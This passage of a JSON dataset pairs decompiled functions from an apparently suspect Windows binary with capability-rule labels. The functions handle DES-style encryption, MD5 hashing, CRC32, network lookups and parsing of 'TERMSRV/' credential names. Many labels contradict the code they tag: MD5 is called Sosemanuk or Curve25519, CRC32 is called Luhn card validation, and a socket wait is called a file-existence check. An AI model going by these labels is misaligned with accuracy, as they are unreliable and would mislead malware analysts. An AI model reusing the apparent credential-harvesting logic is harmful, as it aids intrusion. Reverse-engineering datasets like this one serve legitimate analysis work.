        "decompiled_code": "\nuint __cdecl fcn.0041029c(uint noname_0, int32_t arg_ch, int32_t arg_10h)\n\n{\n    *(arg_10h + 0xb8) = *(arg_ch + 8);\n    *(arg_10h + 0xc4) = *(arg_ch + 0xc);\n    *(arg_10h + 0xb4) = *(arg_ch + 0x10);\n    if (*0x414f0e != 0) {\n        fcn.0040130e(*0x414f0e, *0x414f0a);\n    }\n    return 0;\n}\n",
        "token_count": 141
    },
    "00410697": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004106b0)\n// WARNING: Removing unreachable block (ram,0x004106ba)\n// WARNING: Removing unreachable block (ram,0x004106c3)\n// WARNING: Removing unreachable block (ram,0x004106c8)\n// WARNING: Removing unreachable block (ram,0x004106eb)\n// WARNING: Removing unreachable block (ram,0x00410712)\n// WARNING: Removing unreachable block (ram,0x0041071b)\n// WARNING: Removing unreachable block (ram,0x00410727)\n// WARNING: Removing unreachable block (ram,0x0041076b)\n// WARNING: Removing unreachable block (ram,0x0041072c)\n// WARNING: Removing unreachable block (ram,0x00410742)\n// WARNING: Removing unreachable block (ram,0x00410765)\n// WARNING: Removing unreachable block (ram,0x00410771)\n// WARNING: Removing unreachable block (ram,0x00410781)\n// WARNING: Removing unreachable block (ram,0x0041078f)\n// WARNING: Removing unreachable block (ram,0x00410795)\n// WARNING: Removing unreachable block (ram,0x0041079e)\n// WARNING: Removing unreachable block (ram,0x0041078a)\n\nulong __fastcall fcn.00410697(uint param_1, uint param_2)\n\n{\n    uint in_EAX;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    return CONCAT44(in_EAX, param_2);\n}\n",
        "token_count": 374
    },
    "004107a6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004107c0)\n// WARNING: Removing unreachable block (ram,0x004107ca)\n// WARNING: Removing unreachable block (ram,0x004107d3)\n// WARNING: Removing unreachable block (ram,0x004107d9)\n// WARNING: Removing unreachable block (ram,0x00410975)\n// WARNING: Removing unreachable block (ram,0x0041097d)\n// WARNING: Removing unreachable block (ram,0x004107e4)\n// WARNING: Removing unreachable block (ram,0x004107f2)\n// WARNING: Removing unreachable block (ram,0x00410809)\n// WARNING: Removing unreachable block (ram,0x0041082a)\n// WARNING: Removing unreachable block (ram,0x0041082f)\n// WARNING: Removing unreachable block (ram,0x0041085d)\n// WARNING: Removing unreachable block (ram,0x0041087e)\n// WARNING: Removing unreachable block (ram,0x00410888)\n// WARNING: Removing unreachable block (ram,0x00410895)\n// WARNING: Removing unreachable block (ram,0x004108b8)\n// WARNING: Removing unreachable block (ram,0x00410916)\n// WARNING: Removing unreachable block (ram,0x004108fe)\n// WARNING: Removing unreachable block (ram,0x00410904)\n// WARNING: Removing unreachable block (ram,0x0041090d)\n// WARNING: Removing unreachable block (ram,0x0041091d)\n// WARNING: Removing unreachable block (ram,0x0041092a)\n// WARNING: Removing unreachable block (ram,0x00410938)\n// WARNING: Removing unreachable block (ram,0x0041093e)\n// WARNING: Removing unreachable block (ram,0x00410948)\n// WARNING: Removing unreachable block (ram,0x0041094e)\n// WARNING: Removing unreachable block (ram,0x00410959)\n// WARNING: Removing unreachable block (ram,0x00410961)\n// WARNING: Removing unreachable block (ram,0x00410969)\n// WARNING: Removing unreachable block (ram,0x0041096b)\n// WARNING: Removing unreachable block (ram,0x00410804)\n// WARNING: Removing unreachable block (ram,0x00410973)\n\nulong __fastcall fcn.004107a6(uint param_1, uint param_2)\n\n{\n    uint in_EAX;\n    uint var_2ch;\n    uint lpProfileInfo;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint hProfile;\n    uint lpDestStr;\n    uint hObject;\n    \n    return CONCAT44(in_EAX, param_2);\n}\n",
        "token_count": 609
    },
    "00410d00": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410d00(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_f0h;\n    uint32_t auStack240 [31];\n    char acStack116 [28];\n    uint var_54h;\n    uint var_38h;\n    char acStack32 [28];\n    \n    iVar2 = 0;\n    do {\n        *(&var_38h + iVar2) =\n             (*((\"80( \\x18\\x10\\b\"[iVar2] >> 3) + arg_8h) & *((\"80( \\x18\\x10\\b\"[iVar2] & 7) * 2 + 0x41582c)) != 0;\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x38);\n    iVar2 = 0;\n    do {\n        if (arg_ch == 1) {\n            iVar4 = iVar2 * -2 + 0x1e;\n        }\n        else {\n            iVar4 = iVar2 * 2;\n        }\n        auStack240[iVar4] = 0;\n        auStack240[iVar4 + -1] = 0;\n        iVar3 = 0;\n        do {\n            iVar1 = *(iVar2 + 0x4158d4) + iVar3;\n            if (iVar1 < 0x1c) {\n                acStack116[iVar3] = *(&var_38h + iVar1);\n            }\n            else {\n                acStack116[iVar3] = *(&var_54h + iVar1);\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < 0x1c);\n        iVar3 = 0x1c;\n        do {\n            iVar1 = *(iVar2 + 0x4158d4) + iVar3;\n            if (iVar1 < 0x38) {\n                acStack116[iVar3] = *(&var_38h + iVar1);\n            }\n            else {\n                acStack116[iVar3] = *(&var_54h + iVar1);\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < 0x38);\n        iVar3 = 0;\n        do {\n            if (acStack116[*(iVar3 + 0x4158e4)] != '\\0') {\n                auStack240[iVar4 + -1] = auStack240[iVar4 + -1] | *(iVar3 * 4 + 0x41583c);\n            }\n            if (acStack116[*(iVar3 + 0x4158fc)] != '\\0') {\n                auStack240[iVar4] = auStack240[iVar4] | *(iVar3 * 4 + 0x41583c);\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < 0x18);\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x10);\n    fcn.00410e1a(&var_f0h);\n    return;\n}\n",
        "token_count": 688
    },
    "00410fda": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410fda(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint var_8h;\n    int32_t var_4h;\n    \n    uVar3 = (*arg_8h >> 4 ^ arg_8h[1]) & 0xf0f0f0f;\n    uVar2 = arg_8h[1] ^ uVar3;\n    uVar3 = *arg_8h ^ uVar3 << 4;\n    uVar4 = (uVar3 >> 0x10 ^ uVar2) & 0xffff;\n    uVar2 = uVar2 ^ uVar4;\n    uVar3 = uVar3 ^ uVar4 << 0x10;\n    uVar4 = (uVar2 >> 2 ^ uVar3) & 0x33333333;\n    uVar3 = uVar3 ^ uVar4;\n    uVar2 = uVar2 ^ uVar4 << 2;\n    uVar4 = (uVar2 >> 8 ^ uVar3) & 0xff00ff;\n    uVar3 = uVar3 ^ uVar4;\n    uVar2 = uVar2 ^ uVar4 << 8;\n    uVar2 = uVar2 * 2 | uVar2 >> 0x1f;\n    uVar4 = (uVar3 ^ uVar2) & 0xaaaaaaaa;\n    uVar3 = uVar3 ^ uVar4;\n    uVar2 = uVar2 ^ uVar4;\n    uVar3 = uVar3 * 2 | uVar3 >> 0x1f;\n    var_4h = 8;\n    do {\n        uVar4 = (uVar2 << 0x1c | uVar2 >> 4) ^ *arg_ch;\n        uVar5 = uVar2 ^ arg_ch[1];\n        uVar3 = uVar3 ^ (*((uVar5 & 0x3f) * 4 + 0x416014) |\n                         *((uVar4 & 0x3f) * 4 + 0x415f14) | *((uVar4 >> 6 & 0xfc) + 0x415d14) |\n                         *((uVar4 >> 0xe & 0xfc) + 0x415b14) | *((uVar4 >> 0x16 & 0xfc) + 0x415914) |\n                         *((uVar5 >> 6 & 0xfc) + 0x415e14) | *((uVar5 >> 0xe & 0xfc) + 0x415c14) |\n                        *((uVar5 >> 0x16 & 0xfc) + 0x415a14));\n        puVar1 = arg_ch + 3;\n        uVar4 = (uVar3 << 0x1c | uVar3 >> 4) ^ arg_ch[2];\n        arg_ch = arg_ch + 4;\n        uVar5 = uVar3 ^ *puVar1;\n        uVar2 = uVar2 ^ (*((uVar5 & 0x3f) * 4 + 0x416014) |\n                         *((uVar4 & 0x3f) * 4 + 0x415f14) | *((uVar4 >> 6 & 0xfc) + 0x415d14) |\n                         *((uVar4 >> 0xe & 0xfc) + 0x415b14) | *((uVar4 >> 0x16 & 0xfc) + 0x415914) |\n                         *((uVar5 >> 6 & 0xfc) + 0x415e14) | *((uVar5 >> 0xe & 0xfc) + 0x415c14) |\n                        *((uVar5 >> 0x16 & 0xfc) + 0x415a14));\n        var_4h = var_4h + -1;\n    } while (var_4h != 0);\n    uVar2 = uVar2 << 0x1f | uVar2 >> 1;\n    uVar4 = (uVar3 ^ uVar2) & 0xaaaaaaaa;\n    uVar2 = uVar2 ^ uVar4;\n    uVar3 = uVar3 << 0x1f | (uVar3 ^ uVar4) >> 1;\n    uVar4 = (uVar3 >> 8 ^ uVar2) & 0xff00ff;\n    uVar2 = uVar2 ^ uVar4;\n    uVar3 = uVar3 ^ uVar4 << 8;\n    uVar4 = (uVar3 >> 2 ^ uVar2) & 0x33333333;\n    uVar2 = uVar2 ^ uVar4;\n    uVar3 = uVar3 ^ uVar4 << 2;\n    uVar4 = (uVar2 >> 0x10 ^ uVar3) & 0xffff;\n    uVar3 = uVar3 ^ uVar4;\n    uVar2 = uVar2 ^ uVar4 << 0x10;\n    uVar4 = (uVar2 >> 4 ^ uVar3) & 0xf0f0f0f;\n    *arg_8h = uVar4 << 4 ^ uVar2;\n    arg_8h[1] = uVar3 ^ uVar4;\n    return;\n}\n",
        "token_count": 1237
    },
    "004113b6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004113b6(uint8_t *arg_8h, uint8_t *arg_ch)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uint var_184h;\n    uint var_180h;\n    \n    fcn.00411543(&var_180h);\n    fcn.00411274(0x415814, 0);\n    iVar2 = 0;\n    do {\n        arg_ch[iVar2] = *(iVar2 + 0x415814);\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 8);\n    bVar1 = true;\n    while ((*arg_8h != 0 || (bVar1))) {\n        iVar2 = 0;\n        puVar3 = arg_ch;\n        for (; (iVar2 < 8 && (*arg_8h != 0)); arg_8h = arg_8h + 1) {\n            *puVar3 = *puVar3 ^ *arg_8h & 0x7f;\n            *arg_8h = 0;\n            iVar2 = iVar2 + 1;\n            puVar3 = puVar3 + 1;\n        }\n        fcn.004112b5(arg_ch, arg_ch);\n        bVar1 = false;\n    }\n    fcn.00411584(&var_180h);\n    return;\n}\n",
        "token_count": 310
    },
    "0041144d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041144d(uint8_t *arg_8h, uint8_t *arg_ch)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uint var_184h;\n    uint var_180h;\n    \n    fcn.00411543(&var_180h);\n    fcn.00411274(0x415814, 0);\n    iVar2 = 0;\n    do {\n        arg_ch[iVar2] = *(iVar2 + 0x415814);\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x10);\n    bVar1 = true;\n    while ((*arg_8h != 0 || (bVar1))) {\n        iVar2 = 0;\n        puVar3 = arg_ch;\n        for (; (iVar2 < 0x10 && (*arg_8h != 0)); arg_8h = arg_8h + 1) {\n            *puVar3 = *puVar3 ^ *arg_8h & 0x7f;\n            *arg_8h = 0;\n            iVar2 = iVar2 + 1;\n            puVar3 = puVar3 + 1;\n        }\n        fcn.00411306(arg_ch, arg_ch);\n        bVar1 = false;\n    }\n    fcn.00411584(&var_180h);\n    return;\n}\n",
        "token_count": 313
    },
    "004116d1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004116d1(uint8_t *arg_8h, uint8_t *arg_ch)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uint var_184h;\n    uint var_180h;\n    \n    fcn.00411543(&var_180h);\n    fcn.004114e4(0x415814, 0);\n    iVar2 = 0;\n    do {\n        arg_ch[iVar2] = *(iVar2 + 0x415814);\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x18);\n    bVar1 = true;\n    while ((*arg_8h != 0 || (bVar1))) {\n        iVar2 = 0;\n        puVar3 = arg_ch;\n        for (; (iVar2 < 0x18 && (*arg_8h != 0)); arg_8h = arg_8h + 1) {\n            *puVar3 = *puVar3 ^ *arg_8h & 0x7f;\n            *arg_8h = 0;\n            iVar2 = iVar2 + 1;\n            puVar3 = puVar3 + 1;\n        }\n        fcn.004115c5(arg_ch, arg_ch);\n        bVar1 = false;\n    }\n    fcn.00411584(&var_180h);\n    return;\n}\n",
        "token_count": 315
    },
    "004019d1": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004019d1(uint pstm)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_118h;\n    uint var_114h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint phglobal;\n    \n    uVar2 = 0;\n    iVar1 = sub.ole32.dll_GetHGlobalFromStream(pstm, &phglobal);\n    if (-1 < iVar1) {\n        var_ch = fcn.00401091(pstm);\n        if (3 < var_ch) {\n            iVar1 = sub.kernel32.dll_GlobalLock(phglobal);\n            if (iVar1 != 0) {\n                var_10h = iVar1;\n                var_8h = fcn.004017a5(var_ch);\n                fcn.004017dc(var_10h, var_8h, var_ch);\n                sub.kernel32.dll_GlobalUnlock(phglobal);\n                fcn.00401815(&var_114h, var_8h, 4);\n                iVar1 = var_8h + 4;\n                var_ch = var_ch - 4;\n                fcn.00401880(&var_114h, iVar1, var_ch);\n                fcn.00401356(pstm);\n                uVar2 = fcn.00401537(pstm, iVar1, var_ch);\n                fcn.0040178e(var_8h);\n            }\n        }\n    }\n    fcn.004012c2(pstm);\n    return uVar2;\n}\n",
        "token_count": 341
    },
    "004024bb": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004024bb(uint arg_8h, int32_t arg_ch, uchar *arg_10h)\n\n{\n    bool bVar1;\n    uint32_t uVar2;\n    int32_t extraout_ECX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    \n    iVar4 = 0;\n    if (arg_ch != 0) {\n        do {\n            uVar2 = fcn.0040244c();\n            iVar3 = extraout_ECX;\n            puVar5 = arg_10h;\n            if (0 < extraout_ECX) {\n                do {\n                    arg_10h = puVar5 + 1;\n                    *puVar5 = uVar2;\n                    uVar2 = uVar2 >> 8;\n                    iVar4 = iVar4 + 1;\n                    iVar3 = iVar3 + -1;\n                    puVar5 = arg_10h;\n                } while (iVar3 != 0);\n            }\n            iVar3 = arg_ch + -4;\n            bVar1 = 3 < arg_ch;\n            arg_ch = iVar3;\n        } while (iVar3 != 0 && bVar1);\n    }\n    return iVar4;\n}\n",
        "token_count": 270
    },
    "004017bc": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004017bc(uint *arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    \n    if (arg_ch != 0) {\n        for (uVar1 = arg_ch >> 2; uVar1 != 0; uVar1 = uVar1 - 1) {\n            *arg_8h = 0;\n            arg_8h = arg_8h + 1;\n        }\n        for (arg_ch = arg_ch & 3; arg_ch != 0; arg_ch = arg_ch - 1) {\n            *arg_8h = 0;\n            arg_8h = arg_8h + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 161
    },
    "00401bae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b"
        ],
        "decompiled_code": "\nvoid fcn.00401bae(void)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    \n    uVar3 = 0;\n    do {\n        uVar5 = uVar3 << 1;\n        iVar4 = 9;\n        do {\n            uVar1 = uVar5 & 1;\n            uVar5 = uVar5 >> 1;\n            if (uVar1 != 0) {\n                uVar5 = uVar5 ^ 0xedb88320;\n            }\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n        *(uVar3 * 4 + 0x416b40) = uVar5;\n        uVar2 = uVar3 + 1;\n        uVar3 = uVar2;\n    } while (uVar2 != 0);\n    return;\n}\n",
        "token_count": 215
    },
    "00402409": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.00402409(char *arg_8h, int32_t arg_ch)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    \n    pcVar1 = fcn.004017a5((arg_ch + 0x400) * 2);\n    pcVar3 = pcVar1;\n    do {\n        for (; (arg_ch != 0 && (*arg_8h != '\\n')); arg_8h = arg_8h + 1) {\n            *pcVar3 = *arg_8h;\n            arg_ch = arg_ch + -1;\n            pcVar3 = pcVar3 + 1;\n        }\n        pcVar2 = arg_8h;\n        pcVar4 = pcVar3;\n        if (arg_ch != 0) {\n            pcVar4 = pcVar3 + 1;\n            pcVar2 = arg_8h + 1;\n            *pcVar3 = *arg_8h;\n            arg_ch = arg_ch + -1;\n        }\n        pcVar3 = pcVar4 + 1;\n        *pcVar4 = '\\0';\n        arg_8h = pcVar2;\n    } while (arg_ch != 0);\n    return pcVar1;\n}\n",
        "token_count": 286
    },
    "0040a056": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a056(uint arg_8h, uint lpString, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    \n    fcn.00401522(arg_18h, arg_8h);\n    iVar1 = sub.kernel32.dll_lstrlenW(lpString);\n    fcn.00401558(arg_18h, lpString, iVar1 * 2 + 2);\n    fcn.00401558(arg_18h, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 129
    },
    "00401bd7": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401bd7(uint32_t arg_8h, uint8_t *arg_ch, int32_t arg_10h)\n\n{\n    arg_8h = ~arg_8h;\n    if (arg_10h != 0) {\n        do {\n            arg_8h = *((arg_8h ^ *arg_ch) * 4 + 0x416b40) ^ arg_8h >> 8;\n            arg_ch = arg_ch + 1;\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n    }\n    return ~arg_8h;\n}\n",
        "token_count": 147
    },
    "00401ea4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401ea4(int32_t *arg_8h)\n\n{\n    if (*arg_8h != -1) {\n        sub.kernel32.dll_UnmapViewOfFile(arg_8h[2]);\n        sub.kernel32.dll_CloseHandle(arg_8h[1]);\n        sub.kernel32.dll_CloseHandle(*arg_8h);\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "0040362a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040362a(uint name)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.wsock32.dll_inet_addr(name);\n    if (iVar1 == -1) {\n        iVar1 = sub.wsock32.dll_gethostbyname(name);\n        if (iVar1 == 0) {\n            iVar1 = -1;\n        }\n        else if (*(iVar1 + 0xc) == NULL) {\n            iVar1 = -1;\n        }\n        else {\n            iVar1 = ***(iVar1 + 0xc);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 132
    },
    "00403734": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403734(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    \n    var_10ch = arg_ch;\n    var_108h = 0;\n    var_104h = 1;\n    var_100h = arg_8h;\n    iVar1 = sub.wsock32.dll_select(0, &var_104h, 0, 0, &var_10ch);\n    if ((iVar1 == -1) || (iVar1 == 0)) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 180
    },
    "0040cba9": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040cba9(uint arg_8h, uint arg_ch, int32_t pszFirst, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401522(arg_8h, 0xbeef0000);\n    fcn.00401584(arg_8h, arg_ch);\n    fcn.00401584(arg_8h, pszFirst);\n    fcn.00401558(arg_8h, arg_14h, arg_18h);\n    iVar1 = sub.shlwapi.dll_StrStrIA(pszFirst, 0x413f5c);\n    if (iVar1 == 0) {\n        iVar1 = sub.kernel32.dll_lstrlenA(\"TERMSRV/\");\n        iVar2 = sub.shlwapi.dll_StrStrIA(pszFirst, \"TERMSRV/\");\n        if (iVar2 != 0) {\n            pszFirst = iVar2 + iVar1;\n        }\n        iVar1 = fcn.0040362a(pszFirst);\n        if (iVar1 != -1) {\n            fcn.00401522(arg_8h, 0xbeef0001);\n            fcn.00401584(arg_8h, arg_ch);\n            fcn.00401522(arg_8h, iVar1);\n            fcn.00401558(arg_8h, arg_14h, arg_18h);\n        }\n    }\n    return;\n}\n",
        "token_count": 337
    },
    "0040900d": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.0040900d(uint arg_8h)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    \n    pcVar1 = fcn.00401c09(arg_8h, 0);\n    iVar2 = sub.kernel32.dll_lstrlenA(pcVar1);\n    if (iVar2 != 0) {\n        pcVar3 = pcVar1 + iVar2;\n        while ((pcVar3 = pcVar3 + -1,  pcVar1 <= pcVar3 && ((*pcVar3 == '\\r' || (*pcVar3 == '\\n'))))) {\n            *pcVar3 = '\\0';\n        }\n    }\n    return pcVar1;\n}\n",
        "token_count": 160
    },
    "00402cd6": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00402cd6(int32_t arg_8h, uint32_t arg_ch, uint *arg_10h)\n\n{\n    uint in_EDX;\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t var_14h;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    var_14h = arg_ch >> 6;\n    *(arg_8h + arg_ch) = 0x80;\n    iVar2 = (arg_8h + arg_ch) - (arg_ch & 0x3f);\n    if (0x37 < (arg_ch & 0x3f)) {\n        iVar2 = iVar2 + 0x40;\n        var_14h = var_14h + 1;\n    }\n    *(iVar2 + 0x38) = arg_ch * 8;\n    var_10h = 0x67452301;\n    uStack16 = 0xefcdab89;\n    uStack12 = 0x98badcfe;\n    uStack8 = 0x10325476;\n    fcn.00402d61(&var_10h, arg_8h, var_14h);\n    puVar1 = &var_10h;\n    for (iVar2 = 4; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *arg_10h = *puVar1;\n        puVar1 = puVar1 + 1;\n        arg_10h = arg_10h + 1;\n    }\n    return CONCAT44(var_14h, in_EDX);\n}\n",
        "token_count": 367
    },
    "00410e1a": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410e1a(uint32_t *arg_8h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    uint32_t *puVar4;\n    uint var_80h;\n    uint32_t auStack128 [31];\n    \n    puVar3 = &var_80h;\n    iVar2 = 0x10;\n    do {\n        puVar1 = arg_8h + 1;\n        *puVar3 = (*arg_8h & 0xfc0000) << 6 | (*arg_8h & 0xfc0) << 10 | (*puVar1 & 0xfc0000) >> 10;\n        puVar4 = puVar3 + 1;\n        *puVar3 = *puVar3 | (*puVar1 & 0xfc0) >> 6;\n        *puVar4 = (*arg_8h & 0x3f000) << 0xc | (*arg_8h & 0x3f) << 0x10 | (*puVar1 & 0x3f000) >> 4;\n        puVar3 = puVar3 + 2;\n        *puVar4 = *puVar4 | *puVar1 & 0x3f;\n        iVar2 = iVar2 + -1;\n        arg_8h = arg_8h + 2;\n    } while (iVar2 != 0);\n    fcn.00410ed7(&var_80h);\n    return;\n}\n",
        "token_count": 343
    },
    "00402d61": {
        "rules": [
            "encrypt data using Sosemanuk/d9cb91cf002a4780a153bbbb736437ff"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00402d61(int32_t *arg_8h, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    uint in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint in_EDX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t var_4h;\n    \n    var_4h = arg_10h;\n    do {\n        uVar4 = arg_8h[1];\n        uVar2 = arg_8h[2];\n        uVar3 = arg_8h[3];\n        uVar1 = ((uVar2 ^ uVar3) & uVar4 ^ uVar3) + 0xd76aa478 + *arg_8h + *arg_ch;\n        uVar1 = (uVar1 * 0x80 | uVar1 >> 0x19) + uVar4;\n        uVar3 = ((uVar4 ^ uVar2) & uVar1 ^ uVar2) + 0xe8c7b756 + uVar3 + arg_ch[1];\n        uVar3 = (uVar3 * 0x1000 | uVar3 >> 0x14) + uVar1;\n        uVar2 = ((uVar1 ^ uVar4) & uVar3 ^ uVar4) + 0x242070db + uVar2 + arg_ch[2];\n        uVar2 = (uVar2 * 0x20000 | uVar2 >> 0xf) + uVar3;\n        uVar4 = ((uVar3 ^ uVar1) & uVar2 ^ uVar1) + 0xc1bdceee + uVar4 + arg_ch[3];\n        uVar5 = (uVar4 * 0x400000 | uVar4 >> 10) + uVar2;\n        uVar4 = ((uVar2 ^ uVar3) & uVar5 ^ uVar3) + 0xf57c0faf + uVar1 + arg_ch[4];\n        uVar4 = 